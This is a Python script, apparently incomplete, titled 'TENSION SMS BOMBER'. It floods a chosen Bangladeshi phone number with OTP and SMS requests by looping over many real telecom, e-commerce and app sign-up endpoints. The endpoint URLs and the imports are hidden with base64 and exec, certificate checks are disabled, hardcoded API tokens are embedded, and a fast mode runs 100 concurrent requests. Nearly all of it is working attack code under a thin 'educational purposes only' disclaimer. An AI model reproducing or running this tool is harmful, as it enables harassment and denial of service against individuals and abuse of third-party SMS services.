#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
TENSION SMS BOMBER - FULLY FIXED EDITION
All 34+ APIs - Smart & Controlled Mode
Author: SYLHETYHACKVENGER (THE-ERROR808)
Title: GRAY HAT CYBERSECURITY TELECOM DDOS ATTACK SYSTEM
Warning: This tool is for educational purposes only. Unauthorized use is illegal.
"""

import base64
exec(base64.b64decode(b'aW1wb3J0IGFzeW5jaW8KaW1wb3J0IGFpb2h0dHAKaW1wb3J0IGpzb24KaW1wb3J0IHNzbAppbXBvcnQgdGltZQppbXBvcnQgcmFuZG9tCmltcG9ydCBzeXMKaW1wb3J0IG9zCmltcG9ydCBzaWduYWwKaW1wb3J0IHBsYXRmb3JtCmltcG9ydCBzb2NrZXQKaW1wb3J0IGRhdGV0aW1l').decode())

# Disable SSL warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Obfuscated SSL context
_ssl = ssl.create_default_context()
_ssl.check_hostname = False
_ssl.verify_mode = ssl.CERT_NONE

# Slow configuration - VERY CONTROLLED - ALL 34+ APIs
_cfg = [3, 2, 1, 1, 1]  # [CONCURRENCY=3, LOOP_DELAY=2, MAX_RETRIES=1, WAVES=1, SESSIONS=1]
# Fast configuration - ALL 34+ APIs - FAST SPEED
_fast_cfg = [100, 0, 1, 3, 20]  # [CONCURRENCY=100, LOOP_DELAY=0, MAX_RETRIES=1, WAVES=3, SESSIONS=20]

# Obfuscated colors
_c = {
    'g': '\033[92m', 'r': '\033[91m', 'y': '\033[93m', 'b': '\033[94m',
    'p': '\033[95m', 'c': '\033[96m', 'w': '\033[97m', 'B': '\033[1m',
    'u': '\033[4m', 'e': '\033[0m'
}

# Obfuscated frames
_frames = ['\u280b', '\u2819', '\u2839', '\u2838', '\u283c']

# Global state
_state = {'paused': False, 'exit': False, 'total': 0, 'success': 0, 'start_time': None}
_current_mode = 'slow'  # 'slow' or 'fast'
_target_number = ''

def _sig_handler_1(signum, frame):
    global _state
    _state['exit'] = True
    elapsed = time.time() - _state.get('start_time', time.time())
    print(f"\n\n{_c['r']}🛑 ATTACK STOPPED BY USER!{_c['e']}")
    print(f"{_c['y']}💀 Total requests: {_state['total']}{_c['e']}")
    print(f"{_c['g']}✅ Successful: {_state['success']}{_c['e']}")
    print(f"{_c['c']}⏱️  Time elapsed: {elapsed:.1f}s{_c['e']}")
    print(f"{_c['p']}🔥 Created by: SYLHETYHACKVENGER (THE-ERROR808){_c['e']}")
    sys.exit(0)

def _sig_handler_2(signum, frame):
    global _state
    _state['paused'] = not _state['paused']
    status = "⏸ PAUSED" if _state['paused'] else "▶ RESUMED"
    color = _c['y'] if _state['paused'] else _c['g']
    print(f"\n{color}ATTACK {status}{_c['e']}")

try:
    signal.signal(signal.SIGINT, _sig_handler_1)
    if hasattr(signal, 'SIGTSTP'):
        signal.signal(signal.SIGTSTP, _sig_handler_2)
except AttributeError:
    pass

def _clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def _get_device_info():
    try:
        hostname = socket.gethostname()
        try:
            ip_address = socket.gethostbyname(hostname)
        except:
            ip_address = "127.0.0.1"
        
        system = platform.system()
        release = platform.release()
        
        return {
            "hostname": hostname, "ip": ip_address, "system": system, "release": release
        }
    except Exception:
        return {
            "hostname": "Unknown", "ip": "127.0.0.1", "system": "Unknown", "release": "Unknown"
        }

def _get_time():
    return datetime.datetime.now().strftime("%H:%M:%S")

def _get_date():
    return datetime.datetime.now().strftime("%A, %B %d, %Y")

def _print_banner():
    device_info = _get_device_info()
    current_time = _get_time()
    current_date = _get_date()
    
    banner_lines = [
        f"{_c['r']}{_c['B']}",
        "████████╗███████╗███╗   ██╗███████╗██╗ ██████╗ ███╗   ██╗",
        "╚══██╔══╝██╔════╝████╗  ██║██╔════╝██║██╔═══██╗████╗  ██║",
        "   ██║   █████╗  ██╔██╗ ██║███████╗██║██║   ██║██╔██╗ ██║",
        "   ██║   ██╔══╝  ██║╚██╗██║╚════██║██║██║   ██║██║╚██╗██║",
        "   ██║   ███████╗██║ ╚████║███████║██║╚██████╔╝██║ ╚████║",
        "   ╚═╝   ╚══════╝╚═╝  ╚═══╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝",
        "",
        f"{_c['y']}Tool Name: {_c['w']}TENSION SMS BOMBER{_c['e']}",
        f"{_c['y']}Author: {_c['w']}SYLHETYHACKVENGER (THE-ERROR808){_c['e']}",
        f"{_c['y']}Title: {_c['w']}GRAY HAT CYBERSECURITY TELECOM DDOS ATTACK SYSTEM{_c['e']}",
        f"{_c['r']}⚠️  WARNING: This tool is for educational purposes only. Unauthorized use is illegal. This script is developed for cybersecurity education, research, and authorized testing only. Misusing it to send unsolicited or excessive SMS messages can disrupt communication services. Run it only in controlled environments or with explicit authorization from the owner.{_c['e']}",
        f"{_c['c']}{'=' * 80}{_c['e']}"
    ]
    
    for line in banner_lines:
        print(line)

def _animate_loading(text, duration=2):
    end_time = time.time() + duration
    i = 0
    while time.time() < end_time:
        frame = _frames[i % len(_frames)]
        sys.stdout.write(f'\r{_c["c"]}[{_c["w"]}{frame}{_c["c"]}] {text}...{_c["e"]}')
        sys.stdout.flush()
        time.sleep(0.2)
        i += 1
    print(f'\r{_c["g"]}[{_c["w"]}✓{_c["g"]}] {text} completed!{_c["e"]}')

def _format_phone_number(phone):
    cleaned = ''.join(filter(str.isdigit, phone))
    
    if cleaned.startswith('880'):
        cleaned = cleaned[3:]
    elif cleaned.startswith('88'):
        cleaned = cleaned[2:]
    elif cleaned.startswith('0'):
        cleaned = cleaned[1:]
    
    if not cleaned.startswith('1') or len(cleaned) < 10:
        cleaned = cleaned.zfill(10)
    
    return {
        'original': phone, 'cleaned': cleaned, 'with_0': f"0{cleaned}",
        'with_88': f"88{cleaned}", 'with_880': f"880{cleaned}",
        'with_plus88': f"+88{cleaned}", 'with_plus880': f"+880{cleaned}",
        'international': f"+88-{cleaned}"
    }

def _get_status_bar(total, success, elapsed):
    rate = total / elapsed if elapsed > 0 else 0
    bar_length = 30
    filled = int(min(bar_length, (total / 100) * bar_length if total < 100 else bar_length))
    bar = '█' * filled + '░' * (bar_length - filled)
    return f"Total: {total} | ✅: {success} | Speed: {rate:.1f}/s [{bar}]"

class _ServiceManager:
    def __init__(self, phone_data):
        self.phone_data = phone_data
        self.last_update = time.time()
        
    async def _increment_counters(self, success=True):
        global _state
        _state['total'] += 1
        if success:
            _state['success'] += 1
        
        if _state.get('start_time'):
            elapsed = time.time() - _state['start_time']
            status = _get_status_bar(_state['total'], _state['success'], elapsed)
            sys.stdout.write(f'\r{_c["c"]}[{_get_time()}] {status}{_c["e"]}')
            sys.stdout.flush()

    def _log_request(self, service_name, status, response, phone_used):
        pass
    
    async def _s1(self, session):
        url = base64.b64decode(b'aHR0cHM6Ly9teWJ0Y2wuYnRjbC5nb3YuYmQvYXBpL2VjYXJlL2Fub255bS9zZW5kT1RQLmpzb24=').decode()
        h = {
            "accept": "application/json", 
            "content-type": "application/json", 
            "origin": base64.b64decode(b'aHR0cHM6Ly9teWJ0Y2wuYnRjbC5nb3YuYmQ=').decode(),
            "referer": base64.b64decode(b'aHR0cHM6Ly9teWJ0Y2wuYnRjbC5nb3YuYmQvcmVnaXN0ZXI=').decode(),
            "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
        }
        
        print(f"{_c['y']}crashing the number with + format...{_c['e']}")
        
        for i in range(5):
            prefix = "+" * (i + 1)
            phone = f"{prefix}{self.phone_data['with_0']}"
            payload = {"phoneNbr": phone, "email": "", "OTPType": 1, "userName": ""}
            
            print(f"{_c['c']}[{i+1}/5] ██████████████████████████████████████████████████████████████████████ {phone}...{_c['e']}")
            
            try:
                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15) as resp:
                    text = await resp.text()
                    self._log_request("██████████████████████████████████████████████████████████████████████", resp.status, text, phone)
                    await self._increment_counters(resp.status == 200)
                await asyncio.sleep(2)
            except Exception as e:
                self._log_request("██████████████████████████████████████████████████████████████████████", 0, f"Error: {e}", phone)
                await self._increment_counters(False)
                await asyncio.sleep(2)

    async def _s2(self, session):
        url = base64.b64decode(b'aHR0cHM6Ly9waG9uZWJpbGwuYnRjbC5jb20uYmQvYXBpL2JjYXJlL2Fub255bS9zZW5kT1RQLmpzb24=').decode()
        h = {
            "accept": "application/json", 
            "content-type": "application/json", 
            "origin": base64.b64decode(b'aHR0cHM6Ly9waG9uZWJpbGwuYnRjbC5jb20uYmQ=').decode(),
            "referer": base64.b64decode(b'aHR0cHM6Ly9waG9uZWJpbGwuYnRjbC5jb20uYmQvcmVnaXN0ZXJCY2FyZQ==').decode(),
            "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
        }
        
        print(f"{_c['y']}crashing the number with + format...{_c['e']}")
        
        for i in range(5):
            prefix = "+" * (i + 1)
            phone = f"{prefix}{self.phone_data['with_0']}"
            payload = {"phoneNbr": phone, "email": "", "OTPType": 1, "userName": ""}
            
            print(f"{_c['c']}[{i+1}/5] ██████████████████████████████████████████████████████████████████████ {phone}...{_c['e']}")
            
            try:
                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15) as resp:
                    text = await resp.text()
                    self._log_request("██████████████████████████████████████████████████████████████████████", resp.status, text, phone)
                    await self._increment_counters(resp.status == 200)
                await asyncio.sleep(2)
            except Exception as e:
                self._log_request("██████████████████████████████████████████████████████████████████████", 0, f"Error: {e}", phone)
                await self._increment_counters(False)
                await asyncio.sleep(2)

    async def _s3(self, session):
        url = base64.b64decode(b'aHR0cHM6Ly9hcGktZHluYW1pYy5iaW9zY29wZWxpdmUuY29tL3YyL2F1dGgvbG9naW4/Y291bnRyeT1CRCZwbGF0Zm9ybT13ZWImbGFuZ3VhZ2U9ZW4=').decode()
        h = {
            "accept": "application/json",
            "content-type": "application/json",
            "origin": base64.b64decode(b'aHR0cHM6Ly93d3cuYmlvc2NvcGVwbHVzLmNvbQ==').decode(),
            "referer": base64.b64decode(b'aHR0cHM6Ly93d3cuYmlvc2NvcGVwbHVzLmNvbS8=').decode(),
            "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
        }
        
        print(f"{_c['y']}Target got haunted with + format...{_c['e']}")
        
        for i in range(5):
            prefix = "+" * (i + 1)
            phone = f"{prefix}88{self.phone_data['cleaned']}"
            payload = {"number": phone}
            
            print(f"{_c['c']}[{i+1}/5] ██████████████████████████████████████████████████████████████████████ {phone}...{_c['e']}")
            
            try:
                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15) as resp:
                    text = await resp.text()
                    self._log_request("██████████████████████████████████████████████████████████████████████", resp.status, text, phone)
                    await self._increment_counters(resp.status == 200)
                await asyncio.sleep(2)
            except Exception as e:
                self._log_request("██████████████████████████████████████████████████████████████████████", 0, f"Error: {e}", phone)
                await self._increment_counters(False)
                await asyncio.sleep(2)

    async def _s4(self, session):
        url = base64.b64decode(b'aHR0cHM6Ly9iZGlhLmJ0Y2wuY29tLmJkL2NsaWVudC9jbGllbnQvcmVnaXN0cmF0aW9uTW9iVmVyaWZpY2F0aW9uLTIuanNwP21vZHVsZUlEPTE=').decode()
        h = {
            "content-type": "application/x-www-form-urlencoded",
            "origin": base64.b64decode(b'aHR0cHM6Ly9iZGlhLmJ0Y2wuY29tLmJk').decode(),
            "referer": base64.b64decode(b'aHR0cHM6Ly9iZGlhLmJ0Y2wuY29tLmJkL2NsaWVudC9jbGllbnQvcmVnaXN0cmF0aW9uTW9iVmVyaWZpY2F0aW9uLTEuanNwP21vZHVsZUlEPTE=').decode(),
            "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
        }
        
        print(f"{_c['y']} Tension increasing of the target...{_c['e']}")
        
        for i in range(5):
            phone = self.phone_data['with_0']
            data = {"actionType": "otpSend", "mobileNo": phone}
            
            print(f"{_c['c']}[{i+1}/5] ██████████████████████████████████████████████████████████████████████ {phone}...{_c['e']}")
            
            try:
                async with session.post(url, headers=h, data=data, ssl=_ssl, timeout=15) as resp:
                    text = await resp.text()
                    self._log_request("██████████████████████████████████████████████████████████████████████", resp.status, text, phone)
                    await self._increment_counters(resp.status == 200)
                await asyncio.sleep(2)
            except Exception as e:
                self._log_request("██████████████████████████████████████████████████████████████████████", 0, f"Error: {e}", phone)
                await self._increment_counters(False)
                await asyncio.sleep(2)

    async def _s5(self, session):
        url = base64.b64decode(b'aHR0cHM6Ly9hcGkuYmR0aWNrZXRzLmNvbToyMDEwMC92MS9hdXRo').decode()
        h = {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "origin": base64.b64decode(b'aHR0cHM6Ly9iZHRpY2tldHMuY29t').decode(),
            "referer": base64.b64decode(b'aHR0cHM6Ly9iZHRpY2tldHMuY29tLw==').decode(),
            "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
        }
        
        print(f"{_c['y']} Panic attack increasing...{_c['e']}")
        
        for i in range(5):
            phone = f"+88{self.phone_data['cleaned']}"
            payload = {"createUserCheck": True, "phoneNumber": phone, "applicationChannel": "WEB_APP"}
            
            print(f"{_c['c']}[{i+1}/5] ██████████████████████████████████████████████████████████████████████ {phone}...{_c['e']}")
            
            try:
                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15) as resp:
                    text = await resp.text()
                    self._log_request("██████████████████████████████████████████████████████████████████████", resp.status, text, phone)
                    await self._increment_counters(resp.status == 200)
                await asyncio.sleep(2)
            except Exception as e:
                self._log_request("██████████████████████████████████████████████████████████████████████", 0, f"Error: {e}", phone)
                await self._increment_counters(False)
                await asyncio.sleep(2)

    async def _s6(self, session):
        url = base64.b64decode(b'aHR0cHM6Ly9hcGkuYXBleDR1LmNvbS9hcGkvYXV0aC9sb2dpbg==').decode()
        h = {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "origin": base64.b64decode(b'aHR0cHM6Ly9hcGV4NHUuY29t').decode(),
            "referer": base64.b64decode(b'aHR0cHM6Ly9hcGV4NHUuY29tLw==').decode(),
            "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
        }
        
        print(f"{_c['y']} Crashing the target number...{_c['e']}")
        
        for i in range(5):
            phone = self.phone_data['with_0']
            payload = {"phoneNumber": phone}
            
            print(f"{_c['c']}[{i+1}/5] ██████████████████████████████████████████████████████████████████████ {phone}...{_c['e']}")
            
            try:
                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15) as resp:
                    text = await resp.text()
                    self._log_request("██████████████████████████████████████████████████████████████████████", resp.status, text, phone)
                    await self._increment_counters(resp.status == 200)
                await asyncio.sleep(2)
            except Exception as e:
                self._log_request("██████████████████████████████████████████████████████████████████████", 0, f"Error: {e}", phone)
                await self._increment_counters(False)
                await asyncio.sleep(2)

    async def _s7(self, session):
        url = base64.b64decode(b'aHR0cHM6Ly9hcGkuc3dhcC5jb20uYmQvYXBpL3YxL3NlbmQtb3RwL3Yy').decode()
        h = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": base64.b64decode(b'aHR0cHM6Ly9zd2FwLmNvbS5iZA==').decode(),
            "Referer": base64.b64decode(b'aHR0cHM6Ly9zd2FwLmNvbS5iZC8=').decode(),
            "signature": "JfhpbCI2A9NZt+WAfURnnns/34QgV05RT9vmQkUAcN0=",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
        }
        
        print(f"{_c['y']} Crashing the target number...{_c['e']}")
        
        for i in range(5):
            phone = self.phone_data['with_0']
            payload = {"phone": phone}
            
            print(f"{_c['c']}[{i+1}/5] ██████████████████████████████████████████████████████████████████████ {phone}...{_c['e']}")
            
            try:
                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15) as resp:
                    text = await resp.text()
                    self._log_request("██████████████████████████████████████████████████████████████████████", resp.status, text, phone)
                    await self._increment_counters(resp.status == 200)
                await asyncio.sleep(2)
            except Exception as e:
                self._log_request("██████████████████████████████████████████████████████████████████████", 0, f"Error: {e}", phone)
                await self._increment_counters(False)
                await asyncio.sleep(2)

    async def _s8(self, session):
        url = base64.b64decode(b'aHR0cHM6Ly9hcGkuaWx5bi5nbG9iYWwvYXV0aC9zaWdudXA=').decode()
        h = {
            'accept': 'application/json, text/plain, */*',
            'content-type': 'multipart/form-data',
            'appcode': 'ilyn-bd',
            'origin': base64.b64decode(b'aHR0cHM6Ly9pbHluLmdsb2JhbA==').decode(),
            'referer': base64.b64decode(b'aHR0cHM6Ly9pbHluLmdsb2JhbC8=').decode(),
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36'
        }
        
        print(f"{_c['y']}🔄 Bombing...{_c['e']}")
        
        for i in range(5):
            phone = self.phone_data['with_plus880']
            data = aiohttp.FormData()
            data.add_field('phone', f'{{"code":"BD","number":"{phone}"}}')
            data.add_field('provider', 'sms')
            
            print(f"{_c['c']}[{i+1}/5] ██████████████████████████████████████████████████████████████████████ {phone}...{_c['e']}")
            
            try:
                async with session.post(url, headers=h, data=data, ssl=_ssl, timeout=15) as resp:
                    text = await resp.text()
                    self._log_request("██████████████████████████████████████████████████████████████████████", resp.status, text, phone)
                    await self._increment_counters(resp.status == 200)
                await asyncio.sleep(2)
            except Exception as e:
                self._log_request("██████████████████████████████████████████████████████████████████████", 0, f"Error: {e}", phone)
                await self._increment_counters(False)
                await asyncio.sleep(2)

    async def _s9(self, session):
        url = base64.b64decode(b'aHR0cHM6Ly9hcGkuYXJvZ2dhLmNvbS9hdXRoL3YxL3Ntcy9zZW5kLz9mPXdlYiZiPUNocm9tZSZ2PTE0MS4wLjAuMCZvcz1XaW5kb3dzJm9zdj0xMA==').decode()
        h = {
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': base64.b64decode(b'aHR0cHM6Ly93d3cuYXJvZ2dhLmNvbQ==').decode(),
            'referer': base64.b64decode(b'aHR0cHM6Ly93d3cuYXJvZ2dhLmNvbS8=').decode(),
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36'
        }
        
        print(f"{_c['y']}🔄 Bombing...{_c['e']}")
        
        for i in range(5):
            phone = self.phone_data['with_0']
            data = {'mobile': phone, 'fcmToken': '', 'referral': ''}
            
            print(f"{_c['c']}[{i+1}/5] ██████████████████████████████████████████████████████████████████████ {phone}...{_c['e']}")
            
            try:
                async with session.post(url, headers=h, data=data, ssl=_ssl, timeout=15) as resp:
                    text = await resp.text()
                    self._log_request("██████████████████████████████████████████████████████████████████████", resp.status, text, phone)
                    await self._increment_counters(resp.status == 200)
                await asyncio.sleep(2)
            except Exception as e:
                self._log_request("██████████████████████████████████████████████████████████████████████", 0, f"Error: {e}", phone)
                await self._increment_counters(False)
                await asyncio.sleep(2)

    async def _s10(self, session):
        url = base64.b64decode(b'aHR0cHM6Ly9mdW5kZXNoLmNvbS5iZC9hcGkvYXV0aC9nZW5lcmF0ZU9UUD9zZXJ2aWNlX2tleT0=').decode()
        h = {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json; charset=UTF-8",
            "origin": base64.b64decode(b'aHR0cHM6Ly9mdW5kZXNoLmNvbS5iZA==').decode(),
            "referer": base64.b64decode(b'aHR0cHM6Ly9mdW5kZXNoLmNvbS5iZC9mdW5kZXNoL3Byb2ZpbGU=').decode(),
            "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
        }
        
        print(f"{_c['y']}🔄 Bombing...{_c['e']}")
        
        for i in range(5):
            phone = self.phone_data['with_0']
            payload = {"msisdn": phone}
            
            print(f"{_c['c']}[{i+1}/5] ██████████████████████████████████████████████████████████████████████ {phone}...{_c['e']}")
            
            try:
                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15) as resp:
                    text = await resp.text()
                    self._log_request("██████████████████████████████████████████████████████████████████████", resp.status, text, phone)
                    await self._increment_counters(resp.status == 200)
                await asyncio.sleep(2)
            except Exception as e:
                self._log_request("██████████████████████████████████████████████████████████████████████", 0, f"Error: {e}", phone)
                await self._increment_counters(False)
                await asyncio.sleep(2)

    async def _s11(self, session):
        url = base64.b64decode(b'aHR0cHM6Ly9hcGkuZ2FyaWJvb2thZG1pbi5jb20vYXBpL3YzL3VzZXIvbG9naW4=').decode()
        h = {
            "accept": "application/json",
            "content-type": "application/json",
            "Origin": base64.b64decode(b'aHR0cHM6Ly9nYXJpYm9vay5jb20=').decode(),
            "Referer": base64.b64decode(b'aHR0cHM6Ly9nYXJpYm9vay5jb20v').decode(),
            "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
        }
        
        print(f"{_c['y']}Panic Increasing...{_c['e']}")
        
        for i in range(5):
            phone = self.phone_data['with_0']
            payload = {"mobile": phone, "recaptcha_token": "garibookcaptcha", "channel": "web"}
            
            print(f"{_c['c']}[{i+1}/5] ATTACKING {phone}...{_c['e']}")
            
            try:
                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15) as resp:
                    text = await resp.text()
                    self._log_request("BOMBING", resp.status, text, phone)
                    await self._increment_counters(resp.status == 200)
                await asyncio.sleep(2)
            except Exception as e:
                self._log_request("██████████████████████████████████████████████████████████████████████", 0, f"Error: {e}", phone)
                await self._increment_counters(False)
                await asyncio.sleep(2)

    async def _s12(self, session):
        url = base64.b64decode(b'aHR0cHM6Ly9hY2NvdW50a2l0LnNoZWJhLnh5ei9hcGkvc2hvb3Qtb3Rw').decode()
        h = {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json;charset=UTF-8",
            "custom-headers": '{"portal-name": "Customer Web"}',
            "origin": base64.b64decode(b'aHR0cHM6Ly93d3cuc2hlYmEueHl6').decode(),
            "referer": base64.b64decode(b'aHR0cHM6Ly93d3cuc2hlYmEueHl6Lw==').decode(),
            "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
        }
        
        print(f"{_c['y']} Sending A Bucket Of Frustration...{_c['e']}")
        
        for i in range(5):
            phone = self.phone_data['with_plus88']
            payload = {"mobile": phone, "app_id": "8329815A6D1AE6DD", "api_token": "zYGYWdR5BjNrdNJm9M1xto3MjbVyl8QVoJviGrubR90Bn4L7TnvJPScfzxnH"}
            
            print(f"{_c['c']}[{i+1}/5] ██████████████████████████████████████████████████████████████████████ {phone}...{_c['e']}")
            
            try:
                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15) as resp:
                    text = await resp.text()
                    self._log_request("██████████████████████████████████████████████████████████████████████", resp.status, text, phone)
                    await self._increment_counters(resp.status == 200)
                await asyncio.sleep(2)
            except Exception as e:
                self._log_request("██████████████████████████████████████████████████████████████████████", 0, f"Error: {e}", phone)
                await self._increment_counters(False)
                await asyncio.sleep(2)

    async def _s13(self, session):
        url = base64.b64decode(b'aHR0cHM6Ly9hcHBzLmFwcGxpbmsuY29tLmJkL2FwcHN0b3JlLXY0LXNlcnZlci9sb2dpbi9vdHAvcmVxdWVzdA==').decode()
        h = {
            "Accept": "*/*",
            "Content-Type": "application/json",
            "Origin": base64.b64decode(b'aHR0cHM6Ly9hcHBsaW5rLmNvbS5iZA==').decode(),
            "Referer": base64.b64decode(b'aHR0cHM6Ly9hcHBsaW5rLmNvbS5iZC8=').decode(),
            "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
        }
        
        print(f"{_c['y']}Feeling The Pain...{_c['e']}")
        
        for i in range(5):
            phone = f"88{self.phone_data['cleaned']}"
            payload = {"msisdn": phone}
            
            print(f"{_c['c']}[{i+1}/5] ██████████████████████████████████████████████████████████████████████ {phone}...{_c['e']}")
            
            try:
                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15) as resp:
                    text = await resp.text()
                    self._log_request("██████████████████████████████████████████████████████████████████████", resp.status, text, phone)
                    await self._increment_counters(resp.status == 200)
                await asyncio.sleep(2)
            except Exception as e:
                self._log_request("██████████████████████████████████████████████████████████████████████", 0, f"Error: {e}", phone)
                await self._increment_counters(False)
                await asyncio.sleep(2)

    async def _s14(self, session):
        url = f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={self.phone_data['with_0']}"
        h = {
            "accept": "application/json, text/plain, */*",
            "accept-language": "bn",
            "application-name": "web",
            "referer": "https://bikroy.com/?login-modal=true&redirect-url=/",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
        }
        
        print(f"{_c['y']}Number getting damage...{_c['e']}")
        
        for i in range(5):
            phone = self.phone_data['with_0']
            
            print(f"{_c['c']}[{i+1}/5] ██████████████████████████████████████████████████████████████████████ {phone}...{_c['e']}")
            
            try:
                async with session.get(url, headers=h, ssl=_ssl, timeout=15) as resp:
                    text = await resp.text()
                    self._log_request("██████████████████████████████████████████████████████████████████████", resp.status, text, phone)
                    await self._increment_counters(resp.status == 200)
                await asyncio.sleep(2)
            except Exception as e:
                self._log_request("██████████████████████████████████████████████████████████████████████", 0, f"Error: {e}", phone)
                await self._increment_counters(False)
                await asyncio.sleep(2)

    async def _s15(self, session):
        url = f"https://api.mygp.cinematic.mobi/api/v1/send-common-otp/wap/{self.phone_data['with_plus88']}"
        h = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json;charset=UTF-8",
            "Origin": base64.b64decode(b'aHR0cHM6Ly9jaW5lbWF0aWMubW9iaQ==').decode(),
            "Referer": base64.b64decode(b'aHR0cHM6Ly9jaW5lbWF0aWMubW9iaS8=').decode(),
            "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
        }
        
        print(f"{_c['y']} Disturbing the call service...{_c['e']}")
        
        for i in range(5):
            phone = self.phone_data['with_plus88']
            payload = {"headers": {"Content-Type": "application/json", "Access-Control-Allow-Origin": "*", "Authorization": "Bearer 1pake4mh5ln64h5t26kpvm3iri"}}
            
            print(f"{_c['c']}[{i+1}/5] ██████████████████████████████████████████████████████████████████████ {phone}...{_c['e']}")
            
            try:
                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15) as resp:
                    text = await resp.text()
                    self._log_request("BOMBING", resp.status, text, phone)
                    await self._increment_counters(resp.status == 200)
                await asyncio.sleep(2)
            except Exception as e:
                self._log_request("ATTACKING", 0, f"Error: {e}", phone)
                await self._increment_counters(False)
                await asyncio.sleep(2)

    async def _s16(self, session):
        url = base64.b64decode(b'aHR0cHM6Ly93ZWJsb2dpbmRhLmdyYW1lZW5waG9uZS5jb20vYmFja2VuZC9hcGkvdjEvb3Rw').decode()
        h = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": base64.b64decode(b'aHR0cHM6Ly93d3cuZ3JhbWVlbnBob25lLmNvbQ==').decode(),
            "Referer": base64.b64decode(b'aHR0cHM6Ly93d3cuZ3JhbWVlbnBob25lLmNvbS8=').decode(),
            "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
        }
        
        print(f"{_c['y']} Disturbing the sms service...{_c['e']}")
        
        for i in range(5):
            phone = self.phone_data['with_0']
            data = {"msisdn": phone}
            
            print(f"{_c['c']}[{i+1}/5] ██████████████████████████████████████████████████████████████████████ {phone}...{_c['e']}")
            
            try:
                async with session.post(url, headers=h, data=data, ssl=_ssl, timeout=15) as resp:
                    text = await resp.text()
                    self._log_request("██████████████████████████████████████████████████████████████████████", resp.status, text, phone)
                    await self._increment_counters(resp.status == 200)
                await asyncio.sleep(2)
            except Exception as e:
                self._log_request("██████████████████████████████████████████████████████████████████████", 0, f"Error: {e}", phone)
                await self._increment_counters(False)
                await asyncio.sleep(2)

    async def _s17(self, session):
        url = base64.b64decode(b'aHR0cHM6Ly9hcGkuZ2hvb3JpbGVhcm5pbmcuY29tL2FwaS9hdXRoL3NpZ251cC9vdHA/X2FwcF9wbGF0Zm9ybT13ZWI=').decode()
        h = {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "origin": base64.b64decode(b'aHR0cHM6Ly9naG9vcmlsZWFybmluZy5jb20=').decode(),
            "referer": base64.b64decode(b'aHR0cHM6Ly9naG9vcmlsZWFybmluZy5jb20v').decode(),
            "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
        }
        
        print(f"{_c['y']}Sms Storage getting full...{_c['e']}")
        
        for i in range(5):
            phone = self.phone_data['with_0']
            payload = {"mobile_no": phone}
            
            print(f"{_c['c']}[{i+1}/5] ██████████████████████████████████████████████████████████████████████ {phone}...{_c['e']}")
            
            try:
                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15) as resp:
                    text = await resp.text()
                    self._log_request("██████████████████████████████████████████████████████████████████████", resp.status, text, phone)
                    await self._increment_counters(resp.status == 200)
                await asyncio.sleep(2)
            except Exception as e:
                self._log_request("██████████████████████████████████████████████████████████████████████", 0, f"Error: {e}", phone)
                await self._increment_counters(False)
                await asyncio.sleep(2)

    async def _s18(self, session):
        url = base64.b64decode(b'aHR0cHM6Ly9hcGkuZGVlcHRvcGxheS5jb20vdjIvYXV0aC9sb2dpbj9jb3VudHJ5PUJEJnBsYXRmb3JtPXdlYiZsYW5ndWFnZT1lbg==').decode()
        h = {
            "accept": "application/json",
            "content-type": "application/json",
            "origin": base64.b64decode(b'aHR0cHM6Ly93d3cuZGVlcHRvcGxheS5jb20=').decode(),
            "referer": base64.b64decode(b'aHR0cHM6Ly93d3cuZGVlcHRvcGxheS5jb20v').decode(),
            "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
